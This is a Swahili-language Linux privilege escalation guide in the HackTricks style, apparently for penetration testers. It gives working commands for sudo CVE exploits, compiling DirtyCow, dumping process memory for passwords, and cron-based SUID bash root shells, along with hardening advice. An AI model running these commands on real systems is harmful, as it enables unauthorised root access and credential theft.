# Linux Privilege Escalation

{{#include ../../../banners/hacktricks-training.md}}

Kwa maelezo ya jumla zaidi na mbinu za kihistoria za enumeration, linganisha nyenzo za g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation, na linux-private zilizoorodheshwa kwenye marejeleo.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Taarifa za Mfumo

### Taarifa za OS

Tuanze kwa kupata maarifa kuhusu OS inayoendeshwa.

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Path

Ikiwa **una ruhusa za kuandika kwenye folda yoyote ndani ya kigezo cha `PATH`**, unaweza kuwa na uwezo wa kuteka nyara baadhi ya libraries au binaries:

```bash
echo $PATH
```

### Taarifa za mazingira

Taarifa za kuvutia, nywila au API keys katika vigeu vya mazingira?

```bash
(env || set) 2>/dev/null
```

### Kernel exploits

Angalia toleo la kernel na kama kuna exploit inayoweza kutumika kuongeza mamlaka.

Sehemu ya [Kernel/LPE/CVE](../../main-system-information/kernel-lpe-cves/README.md) inakusanya mifano ya kuongeza mamlaka ya ndani na viungo vya maandishi ya kina zaidi kuhusu Linux kernel katika Binary Exploitation. Thibitisha build na usanidi unaoathiriwa kabla ya kujaribu mfano.

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

Unaweza kupata orodha nzuri ya kernel zilizo hatarini na baadhi ya **compiled exploits** hapa: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) na [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
Tovuti nyingine ambako unaweza kupata **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Ili kutoa matoleo yote ya kernel yaliyo hatarini kutoka kwenye tovuti hiyo, unaweza kufanya hivi:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Zana zinazoweza kusaidia kutafuta kernel exploits ni:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim, hukagua tu exploits za kernel 2.x)

Daima **tafuta kernel version kwenye Google**; huenda kernel version yako imeandikwa kwenye kernel exploit, na hapo utakuwa na uhakika kuwa exploit hiyo ni halali.

Mbinu za ziada za kernel exploitation:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Toleo la Sudo

Kulingana na matoleo ya sudo yaliyo hatarini yanayoonekana katika:

```bash
searchsploit sudo
```

Unaweza kuangalia kama toleo la sudo linaweza kushambuliwa kwa kutumia grep hii.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

sudo **1.9.14 hadi 1.9.17** ya upstream inaruhusu watumiaji wa ndani wasio na privilege kupandisha privilege hadi root kupitia chaguo la `--chroot` wakati sudo inapopakia `/etc/nsswitch.conf` kutoka kwenye directory inayodhibitiwa na mtumiaji; upstream ilirekebisha hili katika **1.9.17p1**. Kagua kila binary ya sudo inayoweza kutekelezwa na iliyo na root-setuid katika njia husika, kwa kuwa `sudo -V` huripoti tu binary iliyochaguliwa na `PATH`. Vifurushi vya usambazaji vinaweza kuwa na marekebisho yaliyorejeshwa bila kubadilisha mfuatano wa toleo la upstream, kwa hiyo hakiki pia hali ya kifurushi cha vendor. Angalia [ushauri wa msimamizi wa sudo](https://www.openwall.com/lists/oss-security/2025/06/30/3).<sup>[[28]](#references)[[29]](#references)</sup>

Hii hapa [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) ya kutumia [udhaifu](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) huo. Kabla ya kuendesha exploit, hakikisha toleo lako la `sudo` lina udhaifu huo na linaunga mkono kipengele cha `chroot`.

Kwa maelezo zaidi, rejelea [ushauri wa awali kuhusu udhaifu](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>

### Sudo: kukwepa sheria za host (CVE-2025-32462)

sudo **1.8.8 hadi 1.9.17** ya upstream inaweza kutathmini sheria za sudoers zinazotegemea host kwa kutumia **jina la host lililotolewa na mtumiaji** kupitia `sudo -h <host>` badala ya **jina halisi la host**; upstream ilirekebisha hili katika **1.9.17p1**. Mtumiaji bado anahitaji kuwa na ingizo linalolingana katika sudoers kwenye host iliyochaguliwa. Kagua marekebisho ya vendor yaliyorejeshwa na binary mbadala za sudo pamoja na sera ya ndani. Angalia [ushauri wa msimamizi wa sudo](https://www.openwall.com/lists/oss-security/2025/06/30/2).<sup>[[29]](#references)</sup>

Mahitaji:
- Toleo la sudo lenye udhaifu
- Sheria za sudoers za host maalum (host si jina la sasa la host wala `ALL`)

Mfano wa muundo wa sudoers:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

Exploit kwa ku-spoof host inayoruhusiwa:

```bash
sudo -h devbox id
sudo -h devbox -i
```

Ikiwa utatuzi wa jina lililochaguliwa utazuiwa, hakiki jinsi jina hilo linavyotatuliwa kwenye host. Kuona tu jina kwenye log au faili ya usanidi hakumaanishi kuwa linaweza kutatuliwa, na kubadilisha `/etc/hosts` kwa kawaida kunahitaji ruhusa za kuandika zenye upendeleo.

#### sudo < v1.8.28

Hii [upstream Runas UID bypass](https://ubuntu.com/security/CVE-2019-14287) inahitaji sheria ya sudo inayotumika ambayo inaruhusu kutekeleza amri kama watumiaji `ALL` huku ikimwondoa root, kama vile `(ALL, !root) /bin/bash`. Mpigaji lazima pia aruhusiwe kutumia sheria hiyo, ikijumuisha sharti lolote la uthibitishaji. Kagua tangazo la usalama la kifurushi kilichosakinishwa: wachuuzi walirudisha marekebisho kwenye matoleo ambayo namba yake inayoonyeshwa bado iko chini ya 1.8.28. Sheria ya `!root` au toleo la zamani pekee halithibitishi kuwepo kwa hatari. Usijaribu amri yenye upendeleo wakati wa upelelezi usioingilia mfumo.

```
sudo -u#-1 /bin/bash
```

### Dmesg uthibitishaji wa sahihi umeshindwa

Angalia **mashine ya smasher2 ya HTB** kwa **mfano** wa jinsi vuln hii inaweza kutumiwa khai.

```bash
dmesg 2>/dev/null | grep "signature"
```

### Uchunguzi zaidi wa mfumo

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## Orodhesha ulinzi unaowezekana

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

Ikiwa uko ndani ya container, anza na sehemu ifuatayo kuhusu usalama wa container, kisha endelea kwenye kurasa za matumizi mabaya mahususi kwa runtime:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Diski

Angalia **ni nini kimewekwa mount na nini hakijawekwa mount**, wapi na kwa nini. Ikiwa kuna chochote ambacho hakijawekwa mount, unaweza kujaribu kukiweka mount na kuangalia taarifa za faragha.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## Programu muhimu

Orodhesha binari muhimu

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Pia, angalia ikiwa **compiler yoyote imesakinishwa**. Hii ni muhimu ikiwa unahitaji kutumia kernel exploit, kwani inapendekezwa kuicompile kwenye mashine utakayoitumia (au kwenye mashine inayofanana).

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### Programu Hatarishi Zilizosakinishwa

Angalia **matoleo ya vifurushi na huduma zilizosakinishwa**. Huenda kuna toleo la zamani la Nagios (kwa mfano) ambalo linaweza ku-exploit kwa privilege escalation…\
Inapendekezwa uangalie mwenyewe matoleo ya programu zinazotia shaka zaidi zilizosakinishwa.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

Ikiwa una ufikiaji wa SSH kwenye mashine, unaweza pia kutumia **openVAS** kuangalia kama kuna programu zilizopitwa na wakati na zenye udhaifu zilizosakinishwa ndani ya mashine.

> [!NOTE] > _Kumbuka kuwa amri hizi zitaonyesha taarifa nyingi ambazo nyingi hazitakuwa na manufaa, kwa hivyo inapendekezwa kutumia programu kama OpenVAS au zinazofanana nayo ambazo zitaangalia kama toleo lolote la programu iliyosakinishwa lina udhaifu unaoweza kutumiwa na exploits zinazojulikana_

## Processes

Angalia **processes zipi** zinazoendeshwa na uhakikishe kama kuna process yoyote yenye **ruhusa nyingi kuliko inavyopaswa** (labda tomcat inaendeshwa na root?)

```bash
ps aux
ps -ef
top -n 1
```

Daima angalia kama kuna [**electron/cef/chromium debuggers**](../../software-information/electron-cef-chromium-debugger-abuse.md) zinazoendesha; unaweza kuzitumia vibaya ili kupata privileges za juu. **Linpeas** hutambua hizo kwa kukagua parameter ya `--inspect` kwenye command line ya process.\
Pia **angalia privileges zako kwenye binaries za processes**; huenda ukaweza kubadilisha binary ya mtu mwingine.

### Minyororo ya parent-child kati ya watumiaji tofauti

Child process inayoendeshwa na **mtumiaji tofauti** na parent wake si lazima iwe hasidi, lakini ni **ishara muhimu ya triage**. Baadhi ya mabadiliko haya yanatarajiwa (`root` kuanzisha service user, login managers kuunda session processes), lakini minyororo isiyo ya kawaida inaweza kufichua wrappers, debug helpers, persistence, au mipaka dhaifu ya runtime trust.

Ukaguzi wa haraka:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

Ikiwa utapata chain ya kushangaza, kagua command line ya parent na faili zote zinazoathiri tabia yake (`config`, `EnvironmentFile`, helper scripts, working directory, writable arguments). Katika njia kadhaa halisi za privesc, child yenyewe haikuweza kuandikwa, lakini **config inayodhibitiwa na parent** au mnyororo wa helper ndio ulioweza.

### Executables zilizofutwa na faili zilizofutwa lakini bado zimefunguliwa

Runtime artifacts mara nyingi bado zinaweza kufikiwa **baada ya kufutwa**. Hii ni muhimu kwa privilege escalation na pia kurejesha ushahidi kutoka kwa process ambayo tayari ina faili nyeti zilizofunguliwa.

Angalia executables zilizofutwa:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

Ikiwa `/proc/<PID>/exe` inaelekeza kwenye `(deleted)`, mchakato bado unaendesha image ya binary ya zamani kutoka kwenye kumbukumbu. Hii ni ishara muhimu ya kuchunguza kwa sababu:

- executable iliyoondolewa inaweza kuwa na strings au credentials zinazovutia
- mchakato unaoendelea unaweza bado kufichua file descriptors muhimu
- binary yenye privileged iliyoondolewa inaweza kuashiria uingiliaji wa hivi karibuni au jaribio la kufuta ushahidi

Kusanya faili zilizoondolewa lakini bado zimefunguliwa kote kwenye mfumo:

```bash
lsof +L1
```

Ukipata descriptor ya kuvutia, irejeshe moja kwa moja:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

Hii ni muhimu hasa pale ambapo mchakato bado umefungua secret, script, export ya database au flag file iliyofutwa.

### Ufuatiliaji wa michakato

Unaweza kutumia zana kama [**pspy**](https://github.com/DominicBreuker/pspy) kufuatilia michakato. Hii inaweza kusaidia sana kutambua michakato iliyo hatarini inayotekelezwa mara kwa mara au wakati seti fulani ya mahitaji imetimizwa.

#### Linux ProcMon chini ya sudo

[ProcMon for Linux](https://github.com/microsoft/ProcMon-for-Linux) inaweza kufuatilia michakato na system calls zilizochaguliwa na kuhifadhi trace ya SQLite. Ikiwa `sudo -l` inaruhusu kutekeleza amri ya `procmon` yenye uwezo wa root bila vizuizi, fikiria kama inaweza kuona ingizo au matokeo ya mchakato wa mtumiaji mwingine. Ruhusa hiyo ni kidokezo cha kufanyia ukaguzi tu: uwezo wa tracer, sera inayotumika, na shughuli za mchakato unaofaa vyote ni muhimu. Trace files zinaweza kuwa na secrets, kwa hivyo kagua exports zilizoidhinishwa kwa uangalifu na uepuke kukusanya data ya michakato isiyohusika.

### Kumbukumbu ya mchakato

Baadhi ya huduma za server huhifadhi **credentials katika maandishi wazi ndani ya kumbukumbu**.\
Kwa kawaida utahitaji **root privileges** ili kusoma kumbukumbu ya michakato ya watumiaji wengine, kwa hivyo hii huwa na manufaa zaidi ikiwa tayari una root na unataka kugundua credentials zaidi.\
Hata hivyo, kumbuka kwamba **kama mtumiaji wa kawaida unaweza kusoma kumbukumbu ya michakato unayomiliki**.

> [!WARNING]
> Kumbuka kwamba siku hizi mashine nyingi **haziruhusu ptrace kwa chaguomsingi**, kumaanisha huwezi kufanya dump ya michakato mingine ya mtumiaji wako asiye na privileges.
>
> Faili _**/proc/sys/kernel/yama/ptrace_scope**_ hudhibiti ufikiaji wa ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: michakato yote inaweza kufanyiwa debugging, mradi iwe na uid sawa. Hii ndiyo njia ya kawaida ambayo ptracing ilifanya kazi.
> - **kernel.yama.ptrace_scope = 1**: ni mchakato mzazi pekee unaoweza kufanyiwa debugging.
> - **kernel.yama.ptrace_scope = 2**: ni admin pekee anayeweza kutumia ptrace, kwa kuwa inahitaji capability ya CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: hakuna michakato inayoweza kufuatiliwa kwa ptrace. Ikishaanzishwa, reboot inahitajika ili kuwezesha ptracing tena.

Mchakato wa same-UID unaofungua kwa muda mfupi password vault unaweza kuwa mpaka tofauti wa credentials. Ikiwa tracing inaruhusiwa, mchakato unaotumika na unaoweza kufanyiwa dump unaweza kufichua password ya vault kupitia input syscalls au kumbukumbu yake, ingawa faili ya vault iliyosimbwa yenyewe bado inalindwa. `ptrace_scope=0` ni sharti moja tu: credentials zinazolingana, hali ya dumpability ya target, Linux security modules nyingine, na muda wa uhai wa mchakato pia ni muhimu. Ili kubaini kama ingizo la vault linaweza kutumika kuingia kama Unix root, unahitaji kufanya ukaguzi tofauti wa matumizi upya ya credentials. Enumeration ya kawaida inapaswa kuripoti sera na candidate process au njia za vault, bila kunasa ingizo au kuonyesha secrets. Tazama [nyaraka za Yama za kernel](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) na [ukaguzi wa ufikiaji wa ptrace](https://man7.org/linux/man-pages/man2/ptrace.2.html).

#### GDB

Ikiwa unaweza kufikia kumbukumbu ya huduma ya FTP (kwa mfano), unaweza kupata Heap na kutafuta credentials zake.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### Script ya GDB

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

Kwa ID fulani ya mchakato, **maps huonyesha jinsi kumbukumbu inavyopangwa ndani ya nafasi pepe ya anwani ya mchakato huo**; pia huonyesha **ruhusa za kila eneo lililopangwa**. Faili bandia ya **mem** **hufichua kumbukumbu yenyewe ya michakato**. Kutoka kwenye faili ya **maps** tunajua ni **maeneo gani ya kumbukumbu yanayoweza kusomwa** na offset zake. Tunatumia maelezo haya kufanya **seek ndani ya faili ya mem na kudump maeneo yote yanayoweza kusomwa** kwenye faili.

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` hutoa ufikiaji wa kumbukumbu **halisi** ya mfumo, si kumbukumbu pepe. Nafasi ya anwani pepe ya kernel inaweza kufikiwa kwa kutumia /dev/kmem.\
Kwa kawaida, `/dev/mem` inaweza kusomwa tu na **root** na kundi la **kmem**.

```
strings /dev/mem -n10 | grep -i PASS
```

### ProcDump ya Linux

ProcDump ni toleo jipya la Linux la zana ya zamani ya ProcDump kutoka kwenye mkusanyiko wa zana za Sysinternals za Windows. Ipate kwenye [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Zana

Ili kufanya dump ya kumbukumbu ya process, unaweza kutumia:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Unaweza kuondoa mwenyewe mahitaji ya root na kufanya dump ya process unayomiliki
- Script A.5 kutoka [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root inahitajika)

### Credentials kutoka kwenye Kumbukumbu ya Process

#### Mfano wa Mwongozo

Ukigundua kuwa process ya authenticator inafanya kazi:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

Unaweza kudump process (tazama sehemu zilizotangulia ili kupata njia mbalimbali za kudump memory ya process) na kutafuta credentials ndani ya memory:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

Zana [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **itaiba taarifa za uthibitishaji zilizo katika maandishi wazi kutoka kwenye kumbukumbu** na kutoka kwa **baadhi ya faili zinazojulikana sana**. Inahitaji ruhusa za root ili kufanya kazi ipasavyo.

| Kipengele                                         | Jina la Mchakato    |
| ------------------------------------------------- | -------------------- |
| Nenosiri la GDM (Kali Desktop, Debian Desktop)    | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Miunganisho ya FTP inayotumika)           | vsftpd               |
| Apache2 (Vipindi vya Active HTTP Basic Auth)      | apache2              |
| OpenSSH (Vipindi vya SSH vinavyotumika - Matumizi ya Sudo) | sshd:          |

#### Regex za Kutafuta/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Kazi za Cron zilizopangwa

### Crontab UI (alseambusher) inayoendeshwa kama root – privesc kupitia scheduler ya wavuti

Ikiwa paneli ya wavuti ya “Crontab UI” (alseambusher/crontab-ui) inaendeshwa kama root na imefungwa kwenye loopback pekee, bado unaweza kuifikia kupitia SSH local port-forwarding na kuunda kazi yenye ruhusa za juu ili kupandisha mamlaka.<sup>[[1]](#references)[[4]](#references)</sup>

Mlolongo wa kawaida
- Gundua port iliyofungwa kwenye loopback pekee (k.m., 127.0.0.1:8000) na Basic-Auth realm kupitia `ss -ntlp` / `curl -v localhost:8000`
- Tafuta credentials kwenye faili za uendeshaji:
  - Backups/scripts zenye `zip -P <password>`
  - systemd unit inayoonyesha `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Weka tunnel na uingie:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Unda job yenye privilege ya juu na uiendeshe mara moja (huweka shell ya SUID):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Itumie:
```bash
/tmp/rootshell -p   # root shell
```

Kuimarisha usalama
- Usiendeshe Crontab UI kama root; tumia mtumiaji maalum na ruhusa chache iwezekanavyo
- Funga huduma kwenye localhost na uzuie ufikiaji zaidi kwa firewall/VPN; usitumie tena nywila zilezile
- Epuka kuweka siri kwenye unit files; tumia secret stores au EnvironmentFile inayoweza kufikiwa na root pekee
- Washa audit/logging kwa utekelezaji wa kazi zinazoanzishwa unapohitaji

Angalia kama kuna kazi yoyote iliyoratibiwa iliyo hatarini. Labda unaweza kutumia script inayoendeshwa na root (wildcard vuln? Je, unaweza kurekebisha faili zinazotumiwa na root? Kutumia symlinks? Kuunda faili maalum kwenye directory inayotumiwa na root?).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

Ikiwa `run-parts` inatumika, angalia ni majina gani yatatekelezwa kweli:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

Hii huepusha matokeo chanya ya uongo. Saraka ya mara kwa mara inayoweza kuandikwa inafaa tu ikiwa jina la faili ya payload yako linalingana na sheria za `run-parts` za mfumo wa ndani.

### Cron path

Kwa mfano, ndani ya _/etc/crontab_ unaweza kupata PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Kumbuka kuwa mtumiaji "user" ana ruhusa za kuandika katika /home/user_)

Ikiwa mtumiaji root atajaribu kutekeleza amri au script ndani ya crontab hii bila kuweka path. Kwa mfano: _\* \* \* \* root overwrite.sh_\
Basi, unaweza kupata root shell kwa kutumia:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Cron kutumia script yenye wildcard (Wildcard Injection)

Ikiwa script inayoendeshwa na root ina “**\***” ndani ya command, unaweza kutumia hili kusababisha mambo yasiyotarajiwa (kama privesc). Mfano:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**Ikiwa wildcard imetanguliwa na njia kama** _**/some/path/\***_ **, si rahisi kushambuliwa (hata** _**./\***_ **si rahisi kushambuliwa).**

Soma ukurasa ufuatao kwa mbinu nyingine za kutumia wildcard:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Uingizaji wa amri kupitia upanuzi wa hesabu wa Bash katika vichanganuzi vya logi za cron

Hesabu za Bash zinaweza kutafsiri maandishi yasiyoaminika kama usemi wa kihesabu. Katika miktadha fulani ya Bash, faharasa ya array ndani ya usemi huo inaweza kutekeleza uingizaji wa amri. Ikiwa cron/parser yenye mapendeleo itaweka maandishi ya logi yanayodhibitiwa na mshambuliaji ndani ya ulinganisho huo wa kihesabu, uingizaji wa amri unaweza kutekelezwa kwa utambulisho wa parser.<sup>[[22]](#references)</sup> Hili hutegemea usemi halisi wa Bash na toleo lake; mfuatano pekee wa `$(...)0` ndani ya kigezo kilichopanuliwa si, peke yake, njia ya kuaminika ya kuonyesha kwamba tathmini inafanyika tena.

Ingizo linaweza pia kutoka kwa metadata ya faili au sehemu nyingine inayosomwa kutoka mahali ambapo mtumiaji anaweza kuandika. Kwa mfano, script ya usafishaji yenye mapendeleo inayosoma tagi ya `Producer` ya picha na kuilinganisha kwa kutumia `[[ "$producer" -eq "expected" ]]` hufanya ulinganisho wa kihesabu, ingawa kigezo kimewekwa ndani ya alama za kunukuu. Fuatilia utambulisho ulioratibiwa, faili zinazoweza kutoa tagi hiyo, mabadiliko yoyote kabla ya ulinganisho, na tabia halisi ya Bash. Kwa lebo za maandishi, tumia ulinganisho wa mfuatano; kwa nambari, hakiki kuwa ingizo lina tarakimu za desimali pekee kabla ya kufanya hesabu. Tazama [sheria za hesabu za Bash](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html).

- Muundo wa kawaida ulio hatarini:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- Jaribio salama la ndani la tabia ya utaratibu wa array-subscript (hakuna privileged process wala mabadiliko ya faili):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

Fuatilia script halisi iliyoratibiwa na njia halisi ya ingizo inayofungua. Hata kama faili la log haliwezi kuandikwa, mtumiaji anayeweza kuandika na kufikia parent directory yake isiyo na sticky bit anaweza kubadilisha ingizo lake la directory; `namei -l` husaidia kutofautisha ruhusa hizo. Njia nyingine ya log inayoweza kuandikwa, scheduler isiyosomeka, au parser ambayo haiwahi kutathmini sehemu hiyo kama Bash arithmetic, haithibitishi uwezekano huu.

### Kuandika juu ya cron script na symlink

Ikiwa **unaweza kurekebisha cron script** inayoendeshwa na root, unaweza kupata shell kwa urahisi sana:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

Ikiwa script inayotekelezwa na root inatumia **directory unayoifikia kikamilifu**, huenda ikafaa kufuta folda hiyo na **kuunda folda ya symlink inayoelekeza kwenye directory nyingine** inayotoa script unayoidhibiti.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Uthibitishaji wa symlink na ushughulikiaji salama zaidi wa faili

Unapokagua scripts/binaries zenye ruhusa za juu zinazosome au kuandika faili kwa kutumia njia, hakikisha jinsi viungo vinavyoshughulikiwa:

- `stat()` hufuata symlink na kurudisha metadata ya lengwa.
- `lstat()` hurudisha metadata ya kiungo chenyewe.
- `readlink -f` na `namei -l` husaidia kubaini lengwa la mwisho na kuonyesha ruhusa za kila sehemu ya njia.

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

Kwa defenders/developers, mifumo salama zaidi dhidi ya mbinu za symlink ni pamoja na:

- `O_EXCL` pamoja na `O_CREAT`: shindwa ikiwa path tayari ipo (huzuia links/files zilizoundwa mapema na mshambuliaji).
- `openat()`: fanya kazi kwa kutumia file descriptor ya directory inayoaminika.
- `mkstemp()`: unda temporary files atomically zikiwa na ruhusa salama.

### Binaries za cron zenye sahihi maalum na payloads zinazoweza kuandikwa
